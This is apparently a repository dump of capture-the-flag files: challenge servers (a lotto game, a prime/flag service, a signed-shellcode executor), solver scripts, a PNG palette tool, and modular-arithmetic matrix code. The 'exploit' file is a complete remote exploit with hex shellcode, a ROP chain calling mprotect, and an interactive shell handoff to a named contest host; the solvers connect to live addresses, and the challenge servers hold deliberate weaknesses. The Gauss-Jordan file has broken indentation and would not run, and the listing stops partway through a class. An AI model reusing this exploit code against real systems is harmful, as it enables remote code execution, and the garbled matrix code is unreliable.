__FILENAME__ = color_decrypto
#!/usr/bin/env python

import Image
import random
import sys

def get_color(x, y, r):
	n = (pow(x, 3) + pow(y, 3)) ^ r
	return (n ^ ((n >> 8) << 8 ))

flag_img = Image.open("enc.png")
im = flag_img.load()

for r in range(256):
    print "Trying key %d" % r
    enc_img = Image.new(flag_img.mode, flag_img.size)
    enpix = enc_img.load()

    for x in range(flag_img.size[0]):
	    for y in range(flag_img.size[1]):
		    if get_color(x, y, r) == im[x,y]:
			enpix[x,y] = 0
		    else:
			enpix[x,y] = 255
		    

    enc_img.save('decoded_%d.png' % r)

########NEW FILE########
__FILENAME__ = brute-force-solution
#!/usr/bin/env python
# coding=utf-8

import socket
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('23.253.207.179', 10001))

known_hashes = {}
count = 0
while True:
	count += 1
	data = s.recv(1024)
	match = re.search('([0-9a-f]{32})', data)
	round_verification_hash = match.group(1)
	match = re.search('Your money: \$(\d+)\s', data)
	money = int(match.group(1))
	print 'Round #%d | Money: $%d | Round verification: %s' % (
		count, money, round_verification_hash
	)
	if money > 1337:
		# Choose “Withdraw your money”, which is now possible. The program will
		# show us the flag before quitting.
		s.send('2\n')
		print s.recv(1024)
		break
	elif round_verification_hash in known_hashes:
		# We’ve seen this hash before, and know which lucky number it maps to.
		s.send('1\n')
		s.recv(1024)
		s.send(known_hashes[round_verification_hash] + '\n')
		print s.recv(1024)
		s.send('\n')
	else:
		# Choose “Withdraw your money”. This fails because we don’t have $1337
		# yet, but it will show us the lucky number which the round verification
		# hash mapped to. Next time we get this hash, we’ll know which number to
		# bet on!
		s.send('2\n')
		data = s.recv(1024)
		match = re.search('The lucky number was: (\d+)\s', data)
		number = match.group(1)
		print 'Lucky number: %s' % number
		known_hashes[round_verification_hash] = number
		s.send('\n')

########NEW FILE########
__FILENAME__ = lotto
from Crypto.Cipher import AES
from Crypto import Random
from datetime import datetime
import random
import os
import time
import sys

flag = open('flag.txt').read()

# config
start_money = 100
cost = 5     # coupon price
reward = 100 # reward for winning
maxNumber = 1000 # we're drawing from 1 to maxNumber
screenWidth = 79

intro = [
	'',
	'Welcome to our Lotto!',
	'Bid for $%d, win $%d!' % (cost, reward),
	'Our system is provably fair:',
	'   Before each bid you\'ll receive encrypted result',
	'   After the whole game we will reveal the key to you',
	'   Then, you can decrypt results and verify that we haven\'t cheated on you!',
	'    (e.g. by drawing based on your input)',
	''
	]

# expand to AES block with random numeric salt
def randomExtend(block):
	limit = 10**(16-len(block))
	# salt
	rnd = random.randrange(0, limit)
	# mix it even more
	rnd = (rnd ** random.randrange(10, 100)) % limit
	# append it to the block
	return block + ('%0'+str(16-len(block))+'x')%rnd

def play():
	# print intro
	print '#' * screenWidth
	for line in intro:
		print  ('# %-' + str(screenWidth-4) + 's #') % line
	print '#' * screenWidth
	print ''

	# prepare everything
	money = start_money

	key = Random.new().read(16) # slow, but secure
	aes = AES.new(key, AES.MODE_ECB)

	# main loop
	quit = False
	while money > 0:
		luckyNumber = random.randrange(maxNumber + 1) # fast random should be enough
		salted = str(luckyNumber) + '#'
		salted = randomExtend(salted)

		print 'Your money: $%d' % money
		print 'Round verification: %s' % aes.encrypt(salted).encode('hex')
		print ''
		print 'Your choice:'
		print '\t1. Buy a coupon for $%d' % cost
		print '\t2. Withdraw your money'
		print '\t3. Quit'

		# read user input
		while True:
			input = raw_input().strip()
			if input == '1':
				# play!
				money -= cost
				sys.stdout.write('Your guess (0-%d): ' % maxNumber)
				guess = int(raw_input().strip())
				if guess == luckyNumber:
					print 'You won $%d!' % reward
					money += reward
				else:
					print 'You lost!'
				break
			elif input == '2':
				# withdraw
				if money > 1337:
					print 'You won! Here\'s your reward:', flag
				else:
					print 'You cannot withdraw your money until you get $1337!'
				break
			elif input == '3':
				quit = True
				break
			else:
				print 'Unknown command!'

		print 'The lucky number was: %d' % luckyNumber
		if quit:
			break
		print '[enter] to continue...'
		raw_input()

	print 'Verification key:', key.encode('hex')
	if money <= 0:
		print 'You\'ve lost all your money! get out!'

if __name__ == '__main__':
	play()

########NEW FILE########
__FILENAME__ = exploit
#!/usr/bin/env python
# coding: utf-8
# This is a mirror of <https://rzhou.org/~ricky/byte_sexual.py>.

import struct
import socket
import telnetlib

shellcode = '31d231c9eb255bb805000000cd80ba4000000089e189c3b803000000cd80bb04000000b804000000cd80cce8d6ffffff6b657900'.decode('hex').ljust(95 '\x90')

def pack_le(v):
	return struct.pack('<I', v)
def pack_be(v):
	return struct.pack('>I', v)
def unpack(v):
	return struct.unpack('<I', v)[0]

endianness = False
def screw_endian(a, b):
	global endianness
	if endianness:
		result = pack_be(a) + pack_le(b)
	else:
		result = pack_le(a) + pack_be(b)
	return result

class JBSP(object):
	magic = 0x5053424A
	root_jfd = None

	def length(self):
		return 8 + 4 + self.root_jfd.length()

	def encode(self):
		global endianness
		header = screw_endian(self.magic, self.length())
		one = 1
		if endianness:
			header += pack_be(one)
		else:
			header += pack_le(one)
		endianness = not endianness
		return header + self.root_jfd.encode()

class JFD(object):
	magic = 0x44464A
	sub_things = []
	data = None

	def length(self):
		return 8 + 2 + len(self.data) + sum(t.length() for t in self.sub_things)
	def encode(self):
		global endianness
		header = screw_endian(self.magic, self.length())

		val = struct.pack('<H', len(self.data))
		if endianness:
			val = struct.pack('>H', len(self.data))
		endianness = not endianness

		return header + val + self.data + ''.join(t.encode() for t in self.sub_things)

class JME(object):
	magic = 0x454D4A
	sub_things = []
	data = None

	def length(self):
		return 8 + 3 + len(self.data) + sum(t.length() for t in self.sub_things)
	def encode(self):
		global endianness
		header = screw_endian(self.magic, self.length())

		val = struct.pack('<H', len(self.data))
		if not endianness:
			val = struct.pack('>H', len(self.data))

		return header + 'A' + val + self.data + ''.join(t.encode() for t in self.sub_things)

class JML(object):
	magic = 0x4C4D4A
	data = None

	def length(self):
		return 8 + len(self.data)
	def encode(self):
		header = screw_endian(self.magic, self.length())
		return header + self.data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('whelk.club.cc.cmu.edu', 4334))
s.connect(('bytesexual.2014.ghostintheshellcode.com', 4334))
f = s.makefile('rw', bufsize=0)
raw_input()

f.write('1\n')
f.write(pack_le(0x80000000))

#jml = JML()
#jml.data = 'A'
#
jme = JME()
jme.data = shellcode
#jme.sub_things = [jml]
jme.sub_things = []

root_jfd = JFD()
root_jfd.data = 'hello'
root_jfd.sub_things = [jme]

jbsp = JBSP()
jbsp.root_jfd = root_jfd

encoded = jbsp.encode()
f.write('1\n')
f.write(pack_le(len(encoded)) + encoded)

f.write('1\n')
f.write(pack_le(0x1000))
f.write('A' * 0x1000)

encoded = jbsp.encode()
f.write('1\n')
f.write(pack_le(len(encoded)) + encoded)

f.write('4\n')
f.write('hello\n')
tlv = screw_endian(0x41414141, 0x7fffffff)
f.write(tlv)

'''
 80483de:   58					  pop	%eax
 80483df:   5e					  pop	%esi
 80483e0:   5f					  pop	%edi
 80483e1:   59					  pop	%ecx
 80483e2:   5a					  pop	%edx
 80483e3:   5b					  pop	%ebx
 80483e4:   cb					  lret
'''
gadget = 0x80483de
int_80_ret = 0x80482e0
cs_32 = 0x23
jbsp = 0x0804C768

#shellcode_addr = 0x775dd110 # mine
shellcode_addr = 0x775e5110 # theirs

payload = 'A' * 2076

payload += pack_le(gadget)
payload += pack_le(0x1b) # alarm
payload += pack_le(0)
payload += pack_le(0)
payload += pack_le(0)
payload += pack_le(0)
payload += pack_le(9999) # 0 seconds
payload += pack_le(int_80_ret)
payload += pack_le(cs_32)

payload += pack_le(gadget)
payload += pack_le(0x4) # write
payload += pack_le(0)
payload += pack_le(0)
payload += pack_le(jbsp) # buf
payload += pack_le(4) # len
payload += pack_le(4) # fd
payload += pack_le(int_80_ret)
payload += pack_le(cs_32)

payload += pack_le(gadget)
payload += pack_le(0x7d) # mprotect
payload += pack_le(0)
payload += pack_le(0)
payload += pack_le(4096) # len
payload += pack_le(7) # prot
payload += pack_le(shellcode_addr & 0xfffff000)
payload += pack_le(int_80_ret)
payload += pack_le(cs_32)
payload += pack_le(shellcode_addr)

for _ in xrange(61):
	f.readline()

f.write(payload)

print 'About to shut down'
s.shutdown(socket.SHUT_WR)
data = f.read(4)

shellcode_addr = unpack(data) + 0x6c
print 'shellcode_addr:', hex(shellcode_addr)
t = telnetlib.Telnet()
t.sock = s
t.interact()

########NEW FILE########
__FILENAME__ = mic_server
#!/usr/bin/python
#-*- coding:utf-8 -*-

import os
import random

from SocketServer import *


FLAG = int(open("flag").read().strip().encode("hex"), 16)
assert 1 << 256 < FLAG < 1 << 512


class Server(ForkingMixIn, TCPServer):
    pass


class Handler(BaseRequestHandler):

    def handle(self):
        client = self.request
        client.settimeout(50.0)

        client.sendall("Give me your prime and I will put the flag into it!\n")

        try:
            p = int(self.read_line(client))
        except:
            client.sendall("hacker?\n")
            return

        if not ((1 << 100) < p < (1 << 200)):
            client.sendall("out of bounds\n")
            return

        if not self.check_prime(p):
            client.sendall("not a prime\n")
            return

        client.sendall("Give me your base:\n")

        try:
            g = int(self.read_line(client)) % p
            if g <= 1 or g >= p - 1:
                raise
        except:
            client.sendall("hacker?\n")
            return

        res = pow(g * FLAG, FLAG, p) * FLAG + FLAG
        res %= p

        client.sendall("Whew, here it is: %s\n" % res)
        return

    def check_prime(self, p):
        """Miller-Rabin test"""
        if p & 1 == 0:
            return False

        m = p - 1
        s = 0
        while m & 1 == 0:
            m >>= 1
            s += 1

        for j in range(100):
            a = random.randint(2, p - 2)
            if gcd(a, p) != 1:
                return False

            b = pow(a, m * (1 << s), p)
            if b in (0, 1, p - 1):
                continue

            for i in range(s):
                b = pow(b, 2, p)

                if b == 1:
                    return False

                if b == p - 1:
                    if i < s - 1:
                        break
                    else:
                        return False
            else:
                return False
        return True

    def read_line(self, client):
        line = ""
        while "\n" not in line:
            s = client.recv(1)
            if not s:
                break
            line += s
        return line


def gcd(a, b):
    while b:
        a, b = b, a % b
    return abs(a)


if __name__ == "__main__":
    Server.allow_reuse_address = True
    Server(("0.0.0.0", 3120), Handler).serve_forever()

########NEW FILE########
__FILENAME__ = task
#!/usr/bin/python
#-*- coding:utf-8 -*-

import os
import time
import random
import ctypes

from hashlib import sha1
from random import randint
from SocketServer import *


N = 0xcec903bcc749d3fdcf6a52d6ac3da6d9c9d70695e0860c92474edbe501620e1228bac1fdcd85bcdd24d7d185998a101313ab63a51d08bcada29701bea5ffd44f1a3e9bf56e211523d145e9054936fab8fee0e3a2b93c19f49bceb80aeda1e3cb564a917e7fa9bfc4a21ccb0f61f6bc7cafdce354ad6ef77a5c5f100cfa307381L
NCHAL = 313333333333333333333333333333333333336
E = 31337
D = int(open("secret").read().strip())
PASSWORD = open("password").read()

EXECMOD = ctypes.cdll.LoadLibrary("./exec.so")


class ExecServer(ForkingMixIn, TCPServer):
    pass


class ExecHandler(BaseRequestHandler):
    def handle(self):
        random.seed(str(time.time) + str(os.getpid()))

        client = self.request
        client.settimeout(5.0)

        client.sendall("Remote Shellcoding Appliance\n")
        client.sendall("1. Sign code\n")
        client.sendall("2. Execute code\n")
        client.sendall("3. Exit\n")
        client.sendall("4. Debug\n")

        choice = client.recv(2).strip()
        {
            "1": self.cmd_sign,
            "2": self.cmd_execute,
            "4": self.cmd_debug,
        }.get(choice, lambda *args: 1)(client)

        client.sendall("let pwn god be with you\n")

    def cmd_sign(self, client):
        client.sendall("Enter shellcode + sha1 in hex:\n")

        shellcode = self.read_line(client).strip().decode("hex")
        shellcode = s2n(shellcode)

        sign = pow(shellcode, D, N)

        rand = randint(1, NCHAL - 1)
        challenge = (pow(31337 + 31336 * (rand + sign), 31337, NCHAL) + sign) % NCHAL
        challenge = hex(challenge)[2:].rstrip("L")

        client.send("Challenge is %s. Your response:\n" % challenge)
        password = client.recv(32).strip()
        if sha1(challenge + password).digest() != sha1(challenge + PASSWORD).digest():
            client.sendall("denied\n")
        else:
            client.sendall(n2s(sign).encode("hex") + "\n")
        return

    def cmd_execute(self, client):
        client.sendall("Enter signed shellcode in hex:\n")

        sign = self.read_line(client).strip().decode("hex")
        sign = s2n(sign)
        signed_shellcode = pow(sign, E, N)
        signed_shellcode = n2s(signed_shellcode).rjust(128, "\x00")

        shellcode = signed_shellcode[1:-20]
        hash = signed_shellcode[-20:]

        if sha1(shellcode).digest() != hash:
            client.sendall("Hacker detected\n")
            return

        EXECMOD.run(shellcode, len(shellcode))

    def cmd_debug(self, client):
        client.sendall("You want to debug me??? lol\n")

    def read_line(self, client, max_read=4096):
        buf = ""
        while len(buf) < max_read and "\n" not in buf:
            s = client.recv(1)
            if not s:
                break
            buf += s
        return buf


def s2n(s):
    if not len(s):
        return 0
    return int(s.encode("hex"), 16)


def n2s(n):
    s = hex(n)[2:].rstrip("L")
    if len(s) % 2 != 0:
        s = "0" + s
    return s.decode("hex")


if __name__ == "__main__":
    [[[[[#
     [[[[[#
      [[[[[#
       [[[[[#
        [[[[[#
         setattr(ExecServer,
                            "allow_reuse_address",
                                                  True)

         or

         setattr(
                 ExecServer,
                            "server",
                                     ExecServer(("0.0.0.0", 3123), ExecHandler))

         or

         getattr(ExecServer
                           .server,
                                   "serve_forever")()

        ]]]]]#
       ]]]]]#
      ]]]]]#
     ]]]]]#
    ]]]]]#

########NEW FILE########
__FILENAME__ = change_palette
#!/usr/bin/env python

import sys
import struct
from zlib import crc32
import os

# PNG file format signature
pngsig = '\x89PNG\r\n\x1a\n'

def swap_palette(filename, n):
    # open in read+write mode
    with open(filename, 'r+b') as f:
        f.seek(0)
        # verify that we have a PNG file
        if f.read(len(pngsig)) != pngsig:
            raise RuntimeError('not a png file!')

        while True:
            chunkstr = f.read(8)
            if len(chunkstr) != 8:
                # end of file
                break

            # decode the chunk header
            length, chtype = struct.unpack('>L4s', chunkstr)
            # we only care about palette chunks
            if chtype == 'PLTE':
                curpos = f.tell()
                paldata = f.read(length)
		# replace palette entry n with white, the rest with black
                paldata = ("\x00\x00\x00" * n) + "\xff\xff\xff" + ("\x00\x00\x00" * (256 - n - 1))
		# replace palette entry 127 to 127 + n with white, the rest with black
                #paldata = ("\x00\x00\x00" * 127) + ("\xff\xff\xff"*n) + ("\x00\x00\x00" * (256 - (127 + n)))

                # go back and write the modified palette in-place
                f.seek(curpos)
                f.write(paldata)
                f.write(struct.pack('>L', crc32(chtype+paldata)&0xffffffff))
            else:
                # skip over non-palette chunks
                f.seek(length+4, os.SEEK_CUR)

if __name__ == '__main__':
    import shutil
    shutil.copyfile(sys.argv[1], sys.argv[2])
    swap_palette(sys.argv[2], int(sys.argv[3]))


########NEW FILE########
__FILENAME__ = guassJordan
'''Matrix manipulation, with adjoined rows, Gauss-Jordan algoithms for
different types or fields and rings, inversion.
Omits general gauss_jordanMod
'''

from mod import ZMod, Mod
from xgcd import mgcd, xgcd

def gauss_jordan(m, eps = 1.0/(10**10)):
  """Puts given matrix (2D array) into the Reduced Row Echelon Form.
	Returns True if successful, False if 'm' is singular.
	Specifically designed to minimize float roundoff.
	NOTE: make sure all the matrix items support fractions!
		An int matrix will NOT work!
	Written by Jarno Elonen in April 2005, released into Public Domain"""
  (h, w) = (len(m), len(m[0]))
  for y in range(0,h):
  maxrow = y
  for y2 in range(y+1, h):  # Find max pivot
    if abs(m[y2][y]) > abs(m[maxrow][y]):
    maxrow = y2
  (m[y], m[maxrow]) = (m[maxrow], m[y])
  if abs(m[y][y]) <= eps:   # Singular?
    return False
  for y2 in range(y+1, h):  # Eliminate column y
    c = m[y2][y] / m[y][y]
    for x in range(y, w):
    m[y2][x] -= m[y][x] * c
  for y in range(h-1, 0-1, -1): # Backsubstitute
  c  = m[y][y]
  for y2 in range(0,y):
    for x in range(w-1, y-1, -1):
    m[y2][x] -=  m[y][x] * m[y2][y] / c
  m[y][y] /= c
  for x in range(h, w):     # Normalize row y
    m[y][x] /= c
  return True

def gauss_jordanExactField(m):
  """Puts given matrix (2D array) into the Reduced Row Echelon Form.
  Returns True if successful, False if 'm' is singular.
  Assumes all element operations are calulated exactly,
  as in a finite field or the rational numbers, but NOT float.
  Use function gauss_jordan for float calculation.
  Use other varants for rings with 0-divisors.
  Based on floating point code by Jarno Elonen,April 2005,
  released into Public Domain"""
  # commentM and comment are not a part of the algorithm -
  #  they just shows progress if global variable VERBOSE is set to True.
  (h, w) = (len(m), len(m[0]))
  commentM('Starting m', m)
  for y in range(0,h):
  comment('Working on row', y)
  for pivot in range(y, h):  # Find nonzero (invertible) pivot
    if m[pivot][y] != 0: break
  else:
    return False
  if y != pivot:
    (m[y], m[pivot]) = (m[pivot], m[y]) # swap pivot row
    commentM('swap rows', y, pivot, m)
  if m[y][y] != 1:
    inv = 1/m[y][y]       # normalize exactly immediately
    for x in range(y, w):
      m[y][x] *= inv
    commentM('Normalizing row', y, 'Multiple by inverse', int(inv), m)
  for y2 in range(y+1, h):  # Eliminate column y, below row y
    c = m[y2][y]
    for x in range(y, w):
    m[y2][x] -= m[y][x] * c
  if y+1 < h: commentM('Zeroed column', y, 'below row', y, m)
  for y in range(h-1, 0-1, -1): # Back substitute
  for y2 in range(0,y):
    for x in range(w-1, y-1, -1):
    m[y2][x] -=  m[y][x] * m[y2][y]
  commentM('Final, after back substitution', m)
  return True

def gauss_jordanModPow2(m):
  """Puts given matrix (2D array) into the Reduced Row Echelon Form.
  Returns True if successful, False if 'm' is singular.
  Assumes all elements are in Z/nZ with n a powr of 2.  One line changed
  Based on floating point code by Jarno Elonen,April 2005,
  released into Public Domain"""
  # Only change from field version is 6th line.
  (h, w) = (len(m), len(m[0]))
  commentM('Starting m', m)
  for y in range(0,h):
  comment('Working on row', y)
  for pivot in range(y, h):  # Find nonzero (invertible) pivot
    if m[pivot][y].value % 2 != 0: #ONLY CHANGE - easy test for invertible
      break
  else: # Python syntax with FOR not if
    return False
  if y != pivot:
    (m[y], m[pivot]) = (m[pivot], m[y]) # swap pivot row
    commentM('swap rows', y, pivot, m)
  if m[y][y] != 1:
    inv = m[y][y].inverse()       # normalize exactly immediately
    for x in range(y, w):
      m[y][x] *= inv
    commentM('Normalizing row', y, 'Multiple by inverse', int(inv), m)
  for y2 in range(y+1, h):  # Eliminate column y, below row y
    c = m[y2][y]
    for x in range(y, w):
    m[y2][x] -= m[y][x] * c
  if y+1 < h: commentM('Zeroed column', y, 'below row', y, m)
  for y in range(h-1, 0-1, -1): # Backsubstitute
  for y2 in range(0,y):
    for x in range(w-1, y-1, -1):
    m[y2][x] -=  m[y][x] * m[y2][y]
  commentM('Final, after back substitution', m)
  return True

def gauss_jordanMod(m):
  """Puts given matrix (2D array) into the Reduced Row Echelon Form.
  Returns True if successful, False if 'm' is singular.
  Assumes all element are modular with some mod n.
  This version is the most general.  More efficient alternatives:
  If n is prime: gauss_jordanExactField
  If n is a power of 2: gauss_jordanModPow2
  Based on floating point code by Jarno Elonen,April 2005,
  released into Public Domain"""

	## setVerbose(False) # for pyc only version
  (h, w) = (len(m), len(m[0]))
  N = m[0][0].modulus()
  commentM('Starting m', m)
  for y in range(0,h):
  comment('working on row', y)
  for y2 in range(y+1, h): # Eliminate column y2, below row y
    a = int(m[y][y])       #   while converting m[y][y]
    b = int(m[y2][y])      #   to gcd of all down from y.
    gcd, s, t, u, v = mgcd(a, b) # convert both rows; use original rows
    m[y][y:], m[y2][y:] = ([s*m[y][i] + t*m[y2][i] for i in range(y, w)],
                 [u*m[y][i] + v*m[y2][i] for i in range(y, w)])
    commentM('row', y, '<-', s, '* row', y, '+', t, '* row', y2, '\n',
         'row', y2, '<-', u, '* row', y, '+', v, '* row', y2, m)
  gcd, inv, t = xgcd(int(m[y][y]), N) # must have result invertible
  if gcd != 1:
    return False
  for x in range(y, w):     # Normalize row y
    m[y][x] *= inv
  commentM('normalize row', y, 'Mult by inverse', inv % N, m)
  for y in range(h-1, 0-1, -1): # Backsubstitute
  for y2 in range(0,y):
    for x in range(w-1, y-1, -1):
    m[y2][x] -=  m[y][x] * m[y2][y]
  commentM('Back substitute to get final solution', m)
##  oldVerbose()   # for pyc only version
  return True

def comment(*args):
  '''print variable length parameter list.'''
  if VERBOSE:
    for arg in args:
      print arg,
    print

def commentM(*args):
  '''Print variable length parameter list, with a matrix/list last.'''
  if VERBOSE:
    comment(*args[:-1])
    display(args[-1])

def makeMat(height, width, elt=0.0):
  ''' Make a matrix with given height, width, filled with elt.'''
  return [[elt for i in range(width)] for j in range(height)]

def identity(height, ONE=1.0):
  '''Return the ientity matrix of size height.
  The value of ONE sets the type of the elements.'''
  ans = makeMat(height, height, ONE-ONE)
  for i, r in enumerate(ans):
    r[i] = ONE
  return ans

def adjoin(m, b):
  '''mutate matrix m, appending rows of matrix b(of same height)'''
  for i, r in enumerate(m):  # enumerate pairs index and element
    r += b[i] # augment the row with b's row, mutating the row of m

def collapseColumns(m, start, past):
  ''' mutate m, removing column c: start <= c < past.'''
  for r in m:
    del(r[start:past]) # remove part from row, mutating the row

def mul(m1, m2, ans=None):
  '''Multiply matrices m1*m2, using ans as place for the answer if not None.
  Returns the answer.
  If m1 is a simple list, it is taken as a row matrix.
  If m2 is a simple list, it is taken as a column matrix.
  The result is always a new matrix (list of lists).
  '''

  if not isinstance(m1[0], list): # left lit to row matrix
    m1 = [m1]
  h = len(m1)
  k = len(m1[0])
  if not isinstance(m2[0], list): # right list to column matrix
    m2 = transpose([m2])
  assert k == len(m2)
  w = len(m2[0])
  if ans is None:
    ans = makeMat(h, w)
  for r in range(h):
    for c in range(w):
      tot = 0
      for i in range(k):
        tot += m1[r][i]*m2[i][c]
      ans[r][c] = tot
  return ans

def linComb(m1, m2, a=1, b=1):
  '''return a*m1 + b*m2 for same sized matrices/lists m1 and m2,
  and scalar (not list) multipliers a, b.'''
  if isinstance(m1, list):
    return [linComb(r1, r2, a, b) for (r1, r2) in zip(m1, m2)]
    # if seq1 contains s0, s1, ..., seq2 contains t0, y1, ...,
    # then zip(seq1, seq2) contains (s0, t0), (s1, t1), ....
  return m1*a + m2*b

add = linComb # just addition with default parameters used

def sub(m1, m2):
  '''return m1 - m2 for same sized matrices/lists m1 and m2.'''
  return linComb(m1, m2, 1, -1)

def matConvert(mat, cls):
  '''Return a new matrix/list with all elements e of matrix m replaced by
  cls(e).  The name is chosen to suggest a class conversion,
  but any function could be used for 1-1 replacements of non-list elements.
  '''
  if isinstance(mat, list):
     return [matConvert(r, cls) for r in mat]
  return cls(mat)

convertMat = matConvert # original naming convention inconsistent!

def copyMat(m):
  '''Return a matrix/list copying each non-list element in matrix m.'''
  def same(x):
    return x
  return matConvert(m, same)

def transpose(m):
  '''Return a new matrix that is the transpose of m.
  If a single list is provided rather than a list of lists, it is treated
  as a single row matrix, [m].
  '''
  if not isinstance(m[0], list):
    m = [m]
  return [[r[j] for r in m] for j in range(len(m[0]))]

def mxvSolve(m, v, gj = gauss_jordan):
  '''solve mx = v for square matrix m, replacing v with the solution x.
  If v is a single list, it is understood as a column matrix.
  Return True on success.
  '''
  isVec = not isinstance(v[0], list)
  vOrig = v
  if isVec:  # convenience conversion
    v = transpose(v)
  m = copyMat(m)
  adjoin(m, v)
  success = gj(m)
  collapseColumns(m, 0, len(m))
  if isVec:
    vOrig[:] = transpose(m)[0]
  else:
    vOrig[:] = m
  return success

def invert(m, gj=gauss_jordan, cls='ignore!'):
  '''Return True and convert m to its inverse in place if possible,
  using Gauss-Jordan variant gj.
  Return False otherwise, and m is not meaningful.
  cls is ignored - obsolete, not needed.'''
  ONE = m[0][0] - m[0][0] + 1  # right class for identity
  v = identity(len(m), ONE)
  success = mxvSolve(m, v, gj)
  m[:] = v
  return success

# Only testing/display functions follow.

def display(m, label=None, colWidth=5):
  '''Pretty print a matrix or list; also prints a scalar.'''
  if not isinstance(m, list):
    if label: print label,
    print m
    return
  if not isinstance(m[0], list):
    if not label:
      label = 'Plain list:'  #? note source as list vs 1 row matrix
    m = [m]
  if label:
    print label
  if isinstance(m[0][0], Mod):
    print 'Elements are mod', m[0][0].modulus()
    m = matConvert(m, int)
  for r in m:
    for x in r:
      print format(x, str(colWidth)),
    print

def showOff(m, cls=float, f=gauss_jordan):
  '''Show off inversion of matrix m using Gauss-Jordan version f,
  where the elements e of m are transformed first to cls(e).
  '''
  m = matConvert(m, cls)
  mc = copyMat(m)
  display(m, 'Matrix to reduce, using ' + f.func_name)
  adjoin(m, identity(len(m), cls(1)))
  display(m, 'With lines adjoined')
  if not f(m):
    print 'Failed!'
  else:
    display(m, 'After GJ variant ' + f.func_name)
  showInvert(mc, f, cls)

def showInvert(m, gj=gauss_jordan, cls=float):
  '''Show off inversion of matrix m using Gauss-Jordan version gj,
  where the elements e of m are transformed first to cls(e).
  '''
  display(m, 'Matrix; Now do inverse in one function call:')
  mc = convertMat(m, cls) # fixed!
  setVerbose(False)
  if not invert(mc, gj):
    print 'Not invertible'
  oldVerbose()
  display(mc, 'Inverted')
  check = mul(m, mc)
  commentM('Multiply and check', check)
  assert  check == identity(len(m), cls(1))

def showMxvSolve(m, v, gj=gauss_jordan, cls=float, verbose=False):
  '''Show off inversion of matrix m using Gauss-Jordan version gj,
  where the elements e of m are transformed first to cls(e).
  '''
  m = matConvert(m, cls)
  v = matConvert(v, cls)
  display(m, 'Matrix')
  display(v, 'v:')
  vc = copyMat(v)
  isVec = not isinstance(v[0], list)
  setVerbose(verbose)
  if not mxvSolve(m, vc, gj):
    print 'Not invertible'
  oldVerbose()
  display(vc, 'Solution')
  check = mul(m, vc)
  if isVec:
    check = transpose(check)[0]
  commentM('Multiply and check', check)
  assert  check == v

def showLinComb(*param):
  '''See linComb for parameters.  Display all parametersand result.'''
  showOp(linComb,
       ['Testing linComb, return a*m1 + b*m2', 'm1', 'm2', 'a', 'b'],
       *param)

def showOp(f, labels, *param):
  print labels[0]
  for i, p in enumerate(param):
    display(p, labels[i+1])
  display(f(*param), 'result')

VERBOSE = False
_V_STACK = []

def setVerbose(verbose):
  '''Set global verbosity, remember old value; pair with an oldVerbose call.
  '''
  global VERBOSE
  _V_STACK.append(VERBOSE)
  VERBOSE = verbose

def oldVerbose():
  '''Recall last global verbosity value remembered by setVerbose.'''
  global VERBOSE
  VERBOSE = _V_STACK.pop()

def test():
  '''test of GassJordan versions.'''
  m = ([[1., 2.],
     [4., 7.] ])
  m2 = ([[0., 1.],
       [1., 7.] ])
  m3 = [[8, 7],
      [3, 5]]
  m4 = [[88, 5, 119],
      [26, 2, 37],
      [55, 29,53]]
  m5 = [[88, 5, 19],
      [33, 2, 37],
      [55, 29,53]]

  m6 = [[ 84,  17,  23],
      [140,  11,   2],
      [105,  19,  44]]
  Mod11 = ZMod(11)
  Mod16 = ZMod(16)
  Mod128 = ZMod(128)
  Mod90 = ZMod(90)
  Mod180 = ZMod(180)

  showOff(m)
  showOff(m2)
  m = matConvert(m, int)
  m2 = matConvert(m2, int)
  showOff(m, Mod11, gauss_jordanExactField)
  showOff(m2, Mod11, gauss_jordanExactField)

  showOff(m3, Mod16, gauss_jordanModPow2)
  showOff(m4, Mod128, gauss_jordanModPow2)

  v = [1, 2, 3]
  showMxvSolve(m4, v, gauss_jordanModPow2, Mod16)

  showOff(m3, Mod16, gauss_jordanMod)  # homework!
  showOff(m4, Mod128, gauss_jordanMod)
  showOff(m5, Mod90, gauss_jordanMod)
  showOff(m6, Mod180, gauss_jordanMod)
  showLinComb(m, m2, 2, -1)
  showOp(sub, ['Testing sub(m1,m2)', 'm1', 'm2'],
       matConvert(m4, Mod128), matConvert(m5, Mod128))

if __name__ == '__main__':
  VERBOSE = True
  test()

########NEW FILE########
__FILENAME__ = mod
from xgcd import xgcd

class FiniteGroup:
  '''Super class provides an iterator for self's group.'''

  def group(self, excludeSelf=False):
    '''Iterator over self's whole group if not excludeSelf,
    starting from self or right after it if excludeSelf.
    This version assuming subclass defines instance method next.
    '''
    if not excludeSelf:
      yield self
    f, last = self.next(), None
    while f != self:
      yield f
      f, last = f.next(last), f

  def next(self, prev=None):
    '''Cyclicly return another element of the group.
    This version depends on methods int, likeFromInt, totCodes.
    Optional argument prev ignored in this version.'''
    return self.likeFromInt((int(self)+1) % self.totCodes())


class ParamClass:
  '''Mixin class allows conversion to object with same parameters.
  Assumes method sameParam and constructor that can copy parameters.'''

  def like(self, val):
    '''convert val to a the same kind of object as self.'''
    if self.sameParam(val):
      return val  # avoid unnecessary copy - assumes immutable
    return self.__class__(val, self)

  def tryLike(self, val):
    '''convert val to the same kind of object as self, with the same
    required parameters, if possible, or return None'''
    try:
      return self.like(val)
    except:
      return None

def ZMod(m):
  '''Return a function that makes Mod objects for a particular modulus m.
  '''
  def ModM(coef):
    return Mod(coef, m)
  return ModM


class Mod(FiniteGroup, ParamClass): #subclass of classes above
  '''A class for modular arithmetic, mod m.
  If m is prime, the inverse() method and division operation are always
  defined, and the class represents a field.

  >>> Mod26 = ZMod(26)
  >>> x = Mod26(4)
  >>> y = Mod26(11)
  >>> z = Mod26(39)
  >>> print x+y
  15 mod 26
  >>> print z
  13 mod 26
  >>> print -x
  22 mod 26
  >>> print z - x
  9 mod 26
  >>> print x*8
  6 mod 26
  >>> print x*z
  0 mod 26
  >>> print x**6
  14 mod 26
  >>> print x/y
  24 mod 26
  >>> x == y
  False
  >>> x*y == -8
  True
  >>> e = Mod(1, 5)
  >>> for x in range(1, 5):
  ...   print x, int(e/x)
  1 1
  2 3
  3 2
  4 4
  '''

  #class invarient:
  #  self.m is the modulus
  #  self.value is the usual smallest nonnegative representative

  def __init__(self, n=0, m=None):
    '''Construct a Mod object.
    If n is a Mod, just copy its n and m, and any m parameter should match.
    If m is a Mod, take its m value.
    Otherwise both m and n should be integers, m > 1; construct n mod m.
    '''
    if isinstance(m, Mod):
      m = m.m
    if isinstance(n, Mod):
